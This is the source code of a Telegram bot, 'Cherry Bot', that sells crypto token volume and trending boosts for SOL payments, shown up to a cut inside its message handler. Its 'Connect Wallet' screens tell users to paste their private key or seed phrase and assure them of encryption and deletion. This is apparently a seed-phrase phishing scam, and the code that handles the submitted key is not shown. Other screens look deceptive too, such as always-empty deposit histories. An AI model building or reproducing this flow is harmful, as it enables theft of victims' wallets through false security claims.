// src/app.ts
import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";
var app = express();
app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.get("/health", (_req, res) => {
  res.json({ status: "ok", ts: Date.now() });
});
app.get("/", (_req, res) => {
  res.json({ name: "Cherry Bot", status: "running" });
});
var app_default = app;

// src/lib/logger.ts
import pino from "pino";
var logger = pino({
  level: process.env.LOG_LEVEL ?? "info",
  ...process.env.NODE_ENV !== "production" ? { transport: { target: "pino-pretty", options: { colorize: true } } } : {}
});

// src/bot/index.ts
import path from "path";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";
import { Telegraf } from "telegraf";

// src/bot/admin.ts
var botRef = null;
function setBot(bot) {
  botRef = bot;
}
async function notifyAdmin(message) {
  const adminId = process.env.ADMIN_TELEGRAM_ID;
  if (!adminId || !botRef) return;
  try {
    await botRef.telegram.sendMessage(adminId, message, { parse_mode: "HTML" });
  } catch (err) {
    logger.warn({ err }, "Failed to notify admin");
  }
}

// src/bot/sessions.ts
var sessions = /* @__PURE__ */ new Map();
function getSession(userId) {
  if (!sessions.has(userId)) sessions.set(userId, {});
  return sessions.get(userId);
}
function setSession(userId, data) {
  sessions.set(userId, { ...getSession(userId), ...data });
}
function clearSession(userId) {
  sessions.set(userId, {});
}

// src/bot/wallet.ts
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import nacl from "tweetnacl";
import bs58 from "bs58";
function deriveWalletForUser(userId) {
  const masterSeed = process.env.MASTER_SEED;
  if (!masterSeed) {
    logger.warn("MASTER_SEED not set \u2014 returning placeholder wallet");
    return { address: "WALLET_NOT_CONFIGURED", privateKey: "" };
  }
  try {
    const seed = bip39.mnemonicToSeedSync(masterSeed);
    const path2 = `m/44'/501'/${userId}'/0'`;
    const derived = derivePath(path2, seed.toString("hex"));
    const keypair = nacl.sign.keyPair.fromSeed(derived.key);
    const address = bs58.encode(keypair.publicKey);
    const privateKey = bs58.encode(keypair.secretKey);
    return { address, privateKey };
  } catch (err) {
    logger.error({ err }, "Failed to derive wallet for user");
    return { address: "WALLET_ERROR", privateKey: "" };
  }
}

// src/bot/tokenInfo.ts
function fmt(n) {
  if (n >= 1e9) return `${(n / 1e9).toFixed(2)}B`;
  if (n >= 1e6) return `${(n / 1e6).toFixed(2)}M`;
  if (n >= 1e3) return `${(n / 1e3).toFixed(2)}K`;
  return n.toFixed(2);
}
async function fetchTokenInfo(ca) {
  try {
    const resp = await fetch(
      `https://api.dexscreener.com/latest/dex/tokens/${ca}`,
      { headers: { "User-Agent": "Mozilla/5.0" } }
    );
    if (resp.ok) {
      const data = await resp.json();
      if (data.pairs && data.pairs.length > 0) {
        const pair = data.pairs[0];
        return {
          name: pair.baseToken?.name ?? "Unknown",
          symbol: pair.baseToken?.symbol ?? "???",
          price: pair.priceUsd ? `$${Number(pair.priceUsd).toFixed(8)}` : "N/A",
          marketCap: pair.fdv ? `$${fmt(pair.fdv)}` : "N/A",
          liquidity: pair.liquidity?.usd ? `$${fmt(pair.liquidity.usd)}` : "N/A",
          volume24h: pair.volume?.h24 ? `$${fmt(pair.volume.h24)}` : "N/A",
          change24h: pair.priceChange?.h24 ? `${Number(pair.priceChange.h24).toFixed(2)}` : "0.00",
          dex: pair.dexId ?? "pumpfun",
          imageUrl: pair.info?.imageUrl ?? pair.baseToken?.logoURI
        };
      }
    }
  } catch (err) {
    logger.debug({ err }, "DexScreener fetch failed");
  }
  try {
    const resp = await fetch(
      `https://frontend-api.pump.fun/coins/${ca}`,
      { headers: { "User-Agent": "Mozilla/5.0" } }
    );
    if (resp.ok) {
      const data = await resp.json();
      return {
        name: data.name ?? "Unknown",
        symbol: data.symbol ?? "???",
        price: "N/A",
        marketCap: data.usd_market_cap ? `$${fmt(data.usd_market_cap)}` : "N/A",
        liquidity: "N/A",
        volume24h: "N/A",
        change24h: "0.00",
        dex: "pumpfun",
        imageUrl: data.image_uri
      };
    }
  } catch (err) {
    logger.debug({ err }, "Pump.fun fetch failed");
  }
  return null;
}

// src/bot/keyboards.ts
import { Markup } from "telegraf";
var mainMenuKeyboard = Markup.keyboard([
  ["\u{1F7E2} Start Bumping"],
  ["\u{1F4CA} Volume Boost", "\u{1F525} Trending Boost"],
  ["\u{1F310} DexScreener", "\u{1F4B0} Deposit"],
  ["\u{1F517} Connect Wallet"],
  ["\u{1F4AC} Contact Support"]
]).resize();
var solPickerKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F535} 0.3 SOL", "sol_0.3"),
    Markup.button.callback("\u{1F7E1} 0.4 SOL", "sol_0.4")
  ],
  [
    Markup.button.callback("\u{1F7E0} 0.5 SOL", "sol_0.5"),
    Markup.button.callback("\u{1F534} 0.6 SOL", "sol_0.6")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var confirmOrderKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 Confirm Order", "confirm_bump")],
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var paymentSentKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 Payment Sent", "submit_tx")],
  [Markup.button.callback("\u274C Cancel Order", "back_main")]
]);
var cancelKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var volumeBoostKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("1.50 SOL - Iron", "vol_iron"),
    Markup.button.callback("2.50 SOL - Bronze", "vol_bronze")
  ],
  [
    Markup.button.callback("3.50 SOL - Gold", "vol_gold"),
    Markup.button.callback("7.50 SOL - Platinum", "vol_platinum")
  ],
  [
    Markup.button.callback("5.00 SOL - Silver", "vol_silver"),
    Markup.button.callback("10.50 SOL - Diamond", "vol_diamond")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var trendingMenuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("SOL TRENDING", "trend_sol")],
  [
    Markup.button.callback("ETH TRENDING", "trend_eth"),
    Markup.button.callback("PUMPFUN TRENDING", "trend_pumpfun")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var solTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F534} TOP 3 \u{1F534}", "st_top3_label"),
    Markup.button.callback("\u{1F534} TOP 10 \u{1F534}", "st_top10_label")
  ],
  [
    Markup.button.callback("\u23F3 3 hr | 1.50 SOL", "st_top3_3hr"),
    Markup.button.callback("\u23F3 3 hr | 1.00 SOL", "st_top10_3hr")
  ],
  [
    Markup.button.callback("\u23F3 6 hr | 2.30 SOL", "st_top3_6hr"),
    Markup.button.callback("\u23F3 6 hr | 1.60 SOL", "st_top10_6hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr | 3.70 SOL", "st_top3_12hr"),
    Markup.button.callback("\u23F3 12 hr | 2.60 SOL", "st_top10_12hr")
  ],
  [
    Markup.button.callback("\u23F3 24 hr | 5.90 SOL", "st_top3_24hr"),
    Markup.button.callback("\u23F3 24 hr | 4.10 SOL", "st_top10_24hr")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var ethTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u23F3 100$", "et_100"),
    Markup.button.callback("\u23F3 200$", "et_200")
  ],
  [Markup.button.callback("\u23F3 300$", "et_300")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var pumpfunTrendingKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F525} P.F.T - 30 SOL", "pft_30")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var dexscreenerKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F534} TOP 6 \u{1F534}", "dex_top6_info")],
  [
    Markup.button.callback("\u23F3 5 hr | 2 SOL", "dex_5hr"),
    Markup.button.callback("\u23F3 7 hr | 3.5 SOL", "dex_7hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr | 7 SOL", "dex_12hr"),
    Markup.button.callback("\u23F3 24 hr | 15 SOL", "dex_24hr")
  ],
  [
    Markup.button.callback("\u23F3 18 hr | 10 SOL", "dex_18hr"),
    Markup.button.callback("\u23F3 32 hr | 22 SOL", "dex_32hr")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var depositKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("ADD", "deposit_add")],
  [
    Markup.button.callback("WITHDRAW", "deposit_withdraw"),
    Markup.button.callback("SOL BALANCE", "deposit_sol_balance")
  ],
  [
    Markup.button.callback("\u{1F4CB} My Deposits", "deposit_my_deposits"),
    Markup.button.callback("\u{1F4CB} My Withdrawals", "deposit_my_withdrawals")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var connectWalletKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
  [Markup.button.callback("\u{1F6E1} Security Guidelines", "wallet_security")],
  [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var securityGuidelinesKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} I Understand, Connect Now", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var howToConnectKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Start Connection", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F6E1} Security Guide...", "wallet_security")
  ]
]);
var mainMenuOnlyKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F3E0} Main Menu", "back_main")]
]);

// src/bot/index.ts
var __filename = fileURLToPath(import.meta.url);
var __dirname = path.dirname(__filename);
var IMG = {
  welcome: path.join(__dirname, "images", "welcome.jpeg"),
  walletconnect: path.join(__dirname, "images", "walletconnect.jpeg"),
  volume: path.join(__dirname, "images", "volume.jpeg"),
  trending: path.join(__dirname, "images", "trending.jpeg")
};
var SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
var ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";
var VOLUME_PACKAGES = {
  vol_iron: { label: "Iron", sol: 1.5, volume: "$50,000", service: "Iron Package" },
  vol_bronze: { label: "Bronze", sol: 2.5, volume: "$250,000", service: "Bronze Package" },
  vol_silver: { label: "Silver", sol: 5, volume: "$100,000,000", service: "Silver Package" },
  vol_gold: { label: "Gold", sol: 3.5, volume: "$100,000", service: "Gold Package" },
  vol_platinum: { label: "Platinum", sol: 7.5, volume: "$500,000", service: "Platinum Package" },
  vol_diamond: { label: "Diamond", sol: 10.5, volume: "$2,500,000", service: "Diamond Package" }
};
var SOL_TREND_PACKAGES = {
  st_top3_3hr: { label: "TOP 3 \u2014 3 hr", sol: 1.5, service: "SOL Trending TOP 3 3hr" },
  st_top3_6hr: { label: "TOP 3 \u2014 6 hr", sol: 2.3, service: "SOL Trending TOP 3 6hr" },
  st_top3_12hr: { label: "TOP 3 \u2014 12 hr", sol: 3.7, service: "SOL Trending TOP 3 12hr" },
  st_top3_24hr: { label: "TOP 3 \u2014 24 hr", sol: 5.9, service: "SOL Trending TOP 3 24hr" },
  st_top10_3hr: { label: "TOP 10 \u2014 3 hr", sol: 1, service: "SOL Trending TOP 10 3hr" },
  st_top10_6hr: { label: "TOP 10 \u2014 6 hr", sol: 1.6, service: "SOL Trending TOP 10 6hr" },
  st_top10_12hr: { label: "TOP 10 \u2014 12 hr", sol: 2.6, service: "SOL Trending TOP 10 12hr" },
  st_top10_24hr: { label: "TOP 10 \u2014 24 hr", sol: 4.1, service: "SOL Trending TOP 10 24hr" }
};
var ETH_TREND_PACKAGES = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" }
};
var DEX_PACKAGES = {
  dex_5hr: { label: "TOP 6 \u2014 5 hr", sol: 2, service: "DexScreener TOP6 5hr" },
  dex_7hr: { label: "TOP 6 \u2014 7 hr", sol: 3.5, service: "DexScreener TOP6 7hr" },
  dex_12hr: { label: "TOP 6 \u2014 12 hr", sol: 7, service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 \u2014 18 hr", sol: 10, service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 \u2014 24 hr", sol: 15, service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 \u2014 32 hr", sol: 22, service: "DexScreener TOP6 32hr" }
};
function createBot() {
  const token2 = process.env.TELEGRAM_BOT_TOKEN;
  if (!token2) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token2);
  setBot(bot);
  bot.start(async (ctx) => {
    const u = ctx.from;
    clearSession(u.id);
    await notifyAdmin(
      `\u{1F195} <b>New User Started Bot</b>
\u{1F464} Name: ${u.first_name}${u.last_name ? " " + u.last_name : ""}
\u{1F516} Username: ${u.username ? "@" + u.username : "N/A"}
\u{1F194} User ID: <code>${u.id}</code>
\u23F0 Time: ${(/* @__PURE__ */ new Date()).toUTCString()}`
    );
    await sendWelcome(ctx);
  });
  bot.hears("\u{1F7E2} Start Bumping", (ctx) => showStartBumping(ctx));
  bot.hears("\u{1F4CA} Volume Boost", (ctx) => showVolumeBoost(ctx));
  bot.hears("\u{1F525} Trending Boost", (ctx) => showTrendingBoost(ctx));
  bot.hears("\u{1F310} DexScreener", (ctx) => showDexScreener(ctx));
  bot.hears("\u{1F4B0} Deposit", (ctx) => showDeposit(ctx));
  bot.hears("\u{1F517} Connect Wallet", (ctx) => showConnectWallet(ctx));
  bot.hears("\u{1F4AC} Contact Support", (ctx) => showSupport(ctx));
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, { step: "awaiting_ca", selectedSol: parseFloat(amt), serviceLabel: "Volume Bumping" });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>${amt} SOL</b>.

Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    const wallet = deriveWalletForUser(ctx.from.id);
    const orderId = randomUUID();
    setSession(ctx.from.id, { step: "awaiting_payment_sent", paymentWallet: wallet.address, orderId });
    await ctx.reply(
      `\u{1F4B0} <b>Payment Required</b>

\u{1F4CB} <b>Order Summary:</b>
\u2022 Token: ${s.tokenName ?? "Unknown"} (${s.tokenSymbol ?? "N/A"})
\u2022 Service: ${s.serviceLabel ?? "Volume Bumping"}
\u2022 Amount: ${s.selectedSol} SOL
\u2022 Order ID: ${orderId}

\u{1F4B3} <b>Payment Instructions:</b>
Send exactly ${s.selectedSol} SOL to:

<b>Solana Wallet:</b>
<code>${wallet.address}</code>

\u26A0\uFE0F <b>Important:</b>
\u2022 Send the EXACT amount: ${s.selectedSol} SOL
\u2022 Use Solana network only
\u2022 Payment expires in 15 minutes
\u2022 After sending, submit your transaction hash below

\u{1F550} Time Remaining: <b>15:00</b>`,
      { parse_mode: "HTML", ...paymentSentKeyboard }
    );
    await notifyAdmin(
      `\u{1F4CB} <b>New Order</b>
\u{1F464} User: ${ctx.from.first_name} (ID: <code>${ctx.from.id}</code>)
\u{1FA99} Token: ${s.tokenName} (${s.tokenSymbol})
\u{1F4DC} CA: <code>${s.contractAddress}</code>
\u2699\uFE0F Service: ${s.serviceLabel}
\u{1F4B0} Amount: ${s.selectedSol} SOL
\u{1F194} Order ID: ${orderId}
\u{1F4EE} Pay to: <code>${wallet.address}</code>`
    );
  });
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await ctx.reply(
      `\u{1F4DD} <b>Submit Transaction Hash</b>

Please paste your Solana transaction hash below:

\u{1F4A1} <b>Where to find it:</b>
\u2022 Copy from your wallet app after sending
\u2022 Check your wallet's transaction history
\u2022 Look for the long string of letters and numbers

\u{1F550} Order ID:
${s.orderId ?? "N/A"}

\u{1F50D} We'll automatically verify your payment once you submit the hash.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  for (const [key, pkg] of Object.entries(VOLUME_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>${pkg.label} Package (${pkg.sol} SOL)</b>
Volume: ${pkg.volume}

Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u2600\uFE0F <b>SOL Trending</b>

Choose your package:`,
      { parse_mode: "HTML", ...solTrendingKeyboard }
    );
  });
  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F535} <b>ETH TREND</b>

Kindly chose the trend you wish to pump on.`,
      { parse_mode: "HTML", ...ethTrendingKeyboard }
    );
  });
  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithPhoto(
      { source: IMG.trending },
      {
        caption: `\u{1F525} <b>PUMP.FUN TRENDING</b> \u{1F525}

\u{1F4A1} THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`,
        parse_mode: "HTML",
        ...pumpfunTrendingKeyboard
      }
    );
  });
  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });
  bot.action("st_top3_label", async (ctx) => ctx.answerCbQuery("TOP 3 packages are in the left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 packages are in the right column"));
  for (const [key, pkg] of Object.entries(SOL_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key,
        paymentWallet: wallet.address
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>${pkg.label} (${pkg.sol} SOL)</b>

Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  for (const [key, pkg] of Object.entries(ETH_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key,
        paymentWallet: wallet.address,
        ethAmount: pkg.usd
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>ETH Trending $${pkg.usd}</b>

Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30",
      paymentWallet: wallet.address
    });
    await ctx.reply(
      `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>P.F.T - 30 SOL</b>

Please enter the Contract Address (CA) of your project:`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));
  for (const [key, pkg] of Object.entries(DEX_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = deriveWalletForUser(ctx.from.id);
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key,
        paymentWallet: wallet.address
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>${pkg.label} (${pkg.sol} SOL)</b>

Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    await ctx.reply(
      `\u2795 <b>Add Funds</b>

Your deposit addresses:

<b>SOL:</b>
<code>${wallet.address}</code>

<b>ETH:</b>
<code>${ETH_ADDRESS}</code>

Minimum deposit: <b>0.30 SOL</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await ctx.reply(
      `\u{1F4B8} <b>Withdraw</b>

Please send your withdrawal address and amount:

Format: <code>ADDRESS AMOUNT</code>
Example: <code>426pdPkQ...GVUM 0.5</code>`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const wallet = deriveWalletForUser(ctx.from.id);
    let balance = "0.0000 SOL";
    try {
      const resp = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [wallet.address, { commitment: "confirmed" }]
        })
      });
      const data = await resp.json();
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch {
      balance = "0.0000 SOL";
    }
    await ctx.reply(
      `\u25CE <b>SOL Balance</b>

<code>${wallet.address}</code>

balance: <b>${balance}</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F4CB} <b>My Deposits</b>

No deposits recorded yet.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F4CB} <b>My Withdrawals</b>

No withdrawals recorded yet.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });
  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F510} <b>Why Connect Your Wallet?</b>

Connecting your wallet unlocks:

\u2022 \u26A1 <b>Instant payments</b> \u2014 no manual transfers
\u2022 \u{1F4CA} <b>Order tracking</b> \u2014 see all your boosts in one place
\u2022 \u{1F4B0} <b>Auto-refunds</b> \u2014 failed orders refunded instantly
\u2022 \u{1F3AF} <b>Priority processing</b> \u2014 connected wallets get faster service
\u2022 \u{1F514} <b>Notifications</b> \u2014 get alerts when your boost goes live`,
      { parse_mode: "HTML", ...connectWalletKeyboard }
    );
  });
  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F6E1} <b>Security Guidelines</b>

\u26A0\uFE0F <b>IMPORTANT SECURITY NOTICE:</b>

\u{1F512} <b>What We Do:</b>
\u2022 End-to-End Encryption - Your data is encrypted at all times
\u2022 No Storage - We never store your private keys permanently
\u2022 Secure Processing - All operations use secure, isolated environments
\u2022 Regular Audits - Our security is regularly tested and verified

\u274C <b>What You Should Know:</b>
\u2022 Never Share - Only enter your keys in official bot interfaces
\u2022 Verify - Always make sure you're using the official bot
\u2022 Test First - Try with small amounts first

\u{1F6E1} <b>Best Practices:</b>
\u2022 Monitor Activity - Regularly check your wallet transactions
\u2022 Stay Updated - Keep your wallet software up to date
\u2022 Use Hardware Wallets - For maximum security with large amounts

\u{1F512} <b>Our Commitment:</b>
We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.

Ready to proceed safely?`,
      { parse_mode: "HTML", ...securityGuidelinesKeyboard }
    );
  });
  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F4F1} <b>How to Connect Your Wallet</b>

\u{1F527} <b>Step-by-Step Process:</b>

1\uFE0F\u20E3 <b>Choose Connection Method</b>
\u2022 Private Key - Direct key import (fastest)
\u2022 Seed Phrase - 12/24 word recovery phrase

2\uFE0F\u20E3 <b>Prepare Your Information</b>
\u2022 Open your wallet app (Phantom, Solflare, etc.)
\u2022 Navigate to wallet settings or security section
\u2022 Copy your private key or seed phrase

3\uFE0F\u20E3 <b>Secure Connection</b>
\u2022 Click "Start Connection" below
\u2022 Paste your key or seed phrase when prompted
\u2022 Connection confirmation will be required

\u{1F4F1} <b>Supported Wallets:</b>
\u2022 Phantom - Most popular Solana wallet
\u2022 Solflare - Advanced features and security
\u2022 Backpack - Modern interface and tools
\u2022 Glow - Mobile-optimized experience
\u2022 Other Solana Wallets - Most SPL-compatible wallets

\u{1F550} Connection Time: Usually 2-5 minutes
\u{1F512} Security: Military-grade encryption throughout

Ready to connect your wallet?`,
      { parse_mode: "HTML", ...howToConnectKeyboard }
    );
  });
  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await ctx.reply(
      `\u{1F517} <b>Connect Your Wallet Now</b>

\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..

Please enter your Private Key or 12 word Seed Phrase to import your wallet:

\u{1F511} <b>Private Key Format:</b>
\u2022 Single long string (64+ characters)
\u2022 Example:
<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>

\u{1F331} <b>Seed Phrase Format:</b>
\u2022 12 or 24 words separated by spaces
\u2022 Example:
<code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>

\u2753 <b>Security Features:</b>
\u2022 End-to-end encryption
\u2022 Secure processing environment
\u2022 Immediate deletion after connection
\u2022 No permanent storage

\u26A1 <b>Auto-Detection:</b>
Our system will automatically detect whether you're providing a private key or seed phrase.`,
      { parse_mode: "HTML" }
    );
  });
  bot.on("text", async (ctx) => {
    const session = getSession(ctx.from.id);
    const text = ctx.message.text.trim();
    const menuBtns = [
      "\u{1F7E2} Start Bumping",
      "\u{1F4CA} Volume Boost",
      "\u{1F525} Trending Boost",
      "\u{1F310} DexScreener",
      "\u{1F4B0} Deposit",
      "\u{1F517} Connect Wallet",
      "\u{1F4AC} Contact Support"
    ];
    if (menuBtns.includes(text)) return;
    switch (session.step) {
      // ── CA entry for all order types ──────────────────────────────────────
      case "awaiting_ca": {
        setSession(ctx.from.id, { contractAddress: text });
        await ctx.reply(
          `\u{1F50D} Looking up token data...
\u23F3 Please wait while we fetch information...`
        );
        const info = await fetchTokenInfo(text);
        if (!info) {
          setSession(ctx.from.id, { step: "awaiting_confirm", tokenName: "Unknown", tokenSymbol: "???" });
          await ctx.reply(
            `\u{1F4CB} <b>Project Details Found!</b>

\u{1F4CA} PUMPFUN_SCRAPE Token

\u2705 <b>Contract Address:</b>
${text}

\u{1F4CA} <b>Token Information:</b>
\u2022 Name: Unknown
\u2022 Symbol: ???
\u2022 Price: 0.00e+0
\u2022 Market Cap: 0.00
\u2022 24h Volume: 0.00
\u2022 Liquidity: 0.00
\u2022 24h Change: 0.00%
\u2022 DEX: pumpfun
\u2022 Chain: solana

\u{1F517} Available on: \u{1F7E2} Pumpswap \u2022 \u{1F7E2} Pump.fun

\u{1F517} View Token: https://pump.fun/coin/${text}`,
            { parse_mode: "HTML", ...confirmOrderKeyboard }
          );
        } else {
          setSession(ctx.from.id, {
            step: "awaiting_confirm",
            tokenName: info.name,
            tokenSymbol: info.symbol
          });
          try {
            if (info.imageUrl) {
              await ctx.replyWithPhoto(
                info.imageUrl,
                {
                  caption: buildTokenFoundMessage(text, info),
                  parse_mode: "HTML",
                  ...confirmOrderKeyboard
                }
              );
            } else {
              await ctx.reply(buildTokenFoundMessage(text, info), {
                parse_mode: "HTML",
                ...confirmOrderKeyboard
              });
            }
          } catch {
